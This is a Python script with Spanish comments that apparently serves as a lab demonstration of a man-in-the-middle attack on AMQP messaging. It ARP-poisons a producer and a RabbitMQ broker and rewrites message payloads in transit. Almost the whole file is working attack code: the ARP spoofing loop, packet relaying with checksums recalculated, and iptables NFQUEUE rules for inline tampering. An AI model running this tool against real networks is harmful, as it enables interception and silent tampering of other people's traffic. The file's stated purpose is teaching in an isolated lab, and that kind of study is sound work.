"""
MITM AMQP con Scapy — SOLO USO EDUCATIVO / LABORATORIO AISLADO.

Flujo del ataque:
  1. Resuelve las IPs/MACs de las dos víctimas (productor y broker).
  2. Envenena sus cachés ARP (ARP spoofing) para situarse en medio del
     tráfico: cada víctima cree que la MAC de la otra es la nuestra.
  3. Intercepta los frames AMQP (puerto 5672) y reemplaza marcadores en el
     cuerpo CONSERVANDO LA LONGITUD (para no romper el framing TCP/AMQP).
  4. Reenvía el paquete modificado a su destino real.

Dos modos (MITM_MODE):
  - relay   : reenvío L2 en user-space con Scapy. Portable, no necesita
              módulos de kernel ni iptables. Funciona en WSL2 y Linux.
  - nfqueue : iptables -j NFQUEUE + NetfilterQueue (técnica inline canónica).
              Requiere un kernel host con nfnetlink_queue (Kali/VM real).

Al terminar (Ctrl+C / SIGTERM) restaura las tablas ARP de las víctimas.
"""
import os
import signal
import socket
import sys
import threading
import time

from scapy.all import ARP, Ether, IP, TCP, Raw, get_if_hwaddr, getmacbyip, sendp, sniff

# --------------------------------------------------------------------------
# Configuración
# --------------------------------------------------------------------------
TARGET_A = os.environ.get("MITM_TARGET_A", "el_enviador")  # productor
TARGET_B = os.environ.get("MITM_TARGET_B", "rabbit")       # broker
AMQP_PORT = int(os.environ.get("AMQP_PORT", "5672"))
MODE = os.environ.get("MITM_MODE", "relay").lower()
IFACE = os.environ.get("MITM_IFACE", "eth0")

# Sustituciones en el payload. ¡AMBOS lados deben medir lo mismo (bytes)!
# Así la longitud del frame AMQP y el stream TCP no se desincronizan.
SUBS = [
    (b"STATUS=NORMAL", b"STATUS=HACKED"),  # 13 == 13
    (b"note=legit",    b"note=pwned"),     # 10 == 10
]
for _a, _b in SUBS:
    assert len(_a) == len(_b), f"Sustitución de distinta longitud: {_a!r}/{_b!r}"


def log(msg):
    print(msg, flush=True)


# --------------------------------------------------------------------------
# Resolución de víctimas
# --------------------------------------------------------------------------
def resolver_ip(nombre, intentos=30):
    for _ in range(intentos):
        try:
            return socket.gethostbyname(nombre)
        except socket.gaierror:
            time.sleep(2)
    raise SystemExit(f"[!] No se pudo resolver {nombre}")


def resolver_mac(ip, intentos=30):
    for _ in range(intentos):
        mac = getmacbyip(ip)
        if mac:
            return mac
        time.sleep(2)
    raise SystemExit(f"[!] No se pudo resolver MAC de {ip}")


# --------------------------------------------------------------------------
# ARP spoofing
# --------------------------------------------------------------------------
def arp_reply(dst_ip, dst_mac, spoof_ip, spoof_mac):
    """Trama ARP 'is-at': dice a dst_mac que spoof_ip está en spoof_mac."""
    trama = Ether(src=spoof_mac, dst=dst_mac) / ARP(
        op=2, psrc=spoof_ip, hwsrc=spoof_mac, pdst=dst_ip, hwdst=dst_mac
    )
    sendp(trama, iface=IFACE, verbose=0)


def envenenar(ip_a, mac_a, ip_b, mac_b, my_mac, parar):
    """Le dice a A que la IP de B está en my_mac, y viceversa. En bucle."""
    log(f"☠️  ARP spoofing: {ip_a} <-> {ip_b} (vía {my_mac})")
    while not parar.is_set():
        arp_reply(ip_a, mac_a, ip_b, my_mac)  # A cree que B está en mi MAC
        arp_reply(ip_b, mac_b, ip_a, my_mac)  # B cree que A está en mi MAC
        parar.wait(2)


def restaurar(ip_a, mac_a, ip_b, mac_b):
    """Reenvía los mapeos correctos para limpiar las cachés ARP."""
    log("🧹 Restaurando tablas ARP de las víctimas...")
    for _ in range(5):
        arp_reply(ip_a, mac_a, ip_b, mac_b)  # B realmente está en mac_b
        arp_reply(ip_b, mac_b, ip_a, mac_a)  # A realmente está en mac_a
        time.sleep(0.2)


# --------------------------------------------------------------------------
# Manipulación del payload (común a los dos modos)
# --------------------------------------------------------------------------
def tamper(load: bytes):
    """Devuelve el payload modificado, o None si no hubo cambios."""
    nuevo = load
    for viejo, reemplazo in SUBS:
        if viejo in nuevo:
            nuevo = nuevo.replace(viejo, reemplazo)
    return nuevo if nuevo != load else None


# --------------------------------------------------------------------------
# MODO RELAY — reenvío L2 en user-space
# --------------------------------------------------------------------------
def run_relay(ip_a, mac_a, ip_b, mac_b, my_mac):
    # Solo nos interesan los frames que, por el envenenamiento, llegan a
    # NUESTRA MAC y vienen de una de las víctimas. Así evitamos bucles
    # (lo que reenviamos lleva la MAC real de destino, no la nuestra).
    def es_relevante(p):
        return (
            Ether in p
            and p[Ether].dst == my_mac
            and p[Ether].src in (mac_a, mac_b)
        )

    def procesar(p):
        src = p[Ether].src
        dst_mac = mac_b if src == mac_a else mac_a

        if p.haslayer(Raw) and p.haslayer(TCP):
            nuevo = tamper(bytes(p[Raw].load))
            if nuevo is not None:
                log(f"👀 ORIGINAL : {bytes(p[Raw].load)!r}")
                p[Raw].load = nuevo
                # Forzar recálculo de longitudes y checksums
                del p[IP].len, p[IP].chksum, p[TCP].chksum
                log(f"💥 MODIFICADO: {nuevo!r}")

        # Reenviar al destino real (reescribimos MACs ethernet)
        p[Ether].src = my_mac
        p[Ether].dst = dst_mac
        try:
            sendp(p, iface=IFACE, verbose=0)
        except Exception as e:  # noqa: BLE001
            log(f"[!] Error reenviando: {e}")

    log(f"🔁 MODO RELAY — reenviando en {IFACE}")
    sniff(iface=IFACE, lfilter=es_relevante, prn=procesar, store=0)


# --------------------------------------------------------------------------
# MODO NFQUEUE — iptables + NetfilterQueue (inline, requiere kernel con soporte)
# --------------------------------------------------------------------------
def run_nfqueue():
    from netfilterqueue import NetfilterQueue  # import perezoso

    def set_ip_forward(v):
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(str(v))

    qnum = 1
    set_ip_forward(1)
    os.system(f"iptables -I FORWARD -p tcp --dport {AMQP_PORT} -j NFQUEUE --queue-num {qnum}")
    os.system(f"iptables -I FORWARD -p tcp --sport {AMQP_PORT} -j NFQUEUE --queue-num {qnum}")

    def cb(pkt):
        data = pkt.get_payload()
        scapy_pkt = IP(data)
        if scapy_pkt.haslayer(Raw) and scapy_pkt.haslayer(TCP):
            nuevo = tamper(bytes(scapy_pkt[Raw].load))
            if nuevo is not None:
                log(f"👀 ORIGINAL : {bytes(scapy_pkt[Raw].load)!r}")
                scapy_pkt[Raw].load = nuevo
                del scapy_pkt[IP].len, scapy_pkt[IP].chksum, scapy_pkt[TCP].chksum
                pkt.set_payload(bytes(scapy_pkt))
                log(f"💥 MODIFICADO: {nuevo!r}")
        pkt.accept()

    nfq = NetfilterQueue()
    nfq.bind(qnum, cb)
    log(f"🔁 MODO NFQUEUE — cola {qnum}, puerto {AMQP_PORT}")
    try:
        nfq.run()
    finally:
        os.system("iptables -D FORWARD -p tcp --dport %d -j NFQUEUE --queue-num %d" % (AMQP_PORT, qnum))
        os.system("iptables -D FORWARD -p tcp --sport %d -j NFQUEUE --queue-num %d" % (AMQP_PORT, qnum))
        set_ip_forward(0)
        nfq.unbind()


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------
def main():
    log("🧃 Sniffer MITM arrancando...")
    log(f"    iface={IFACE}  modo={MODE}  objetivos={TARGET_A} <-> {TARGET_B}")

    ip_a = resolver_ip(TARGET_A)
    ip_b = resolver_ip(TARGET_B)
    my_mac = get_if_hwaddr(IFACE)
    mac_a = resolver_mac(ip_a)
    mac_b = resolver_mac(ip_b)
    log(f"    A {TARGET_A} = {ip_a} / {mac_a}")
    log(f"    B {TARGET_B} = {ip_b} / {mac_b}")
    log(f"    yo = {my_mac}")

    parar = threading.Event()
    hilo = threading.Thread(
        target=envenenar, args=(ip_a, mac_a, ip_b, mac_b, my_mac, parar), daemon=True
    )
    hilo.start()

    def apagar(*_):
        parar.set()
        restaurar(ip_a, mac_a, ip_b, mac_b)
        sys.exit(0)

    signal.signal(signal.SIGINT, apagar)
    signal.signal(signal.SIGTERM, apagar)

    try:
        if MODE == "nfqueue":
            run_nfqueue()
        else:
            run_relay(ip_a, mac_a, ip_b, mac_b, my_mac)
    finally:
        parar.set()
        restaurar(ip_a, mac_a, ip_b, mac_b)


if __name__ == "__main__":
    main()
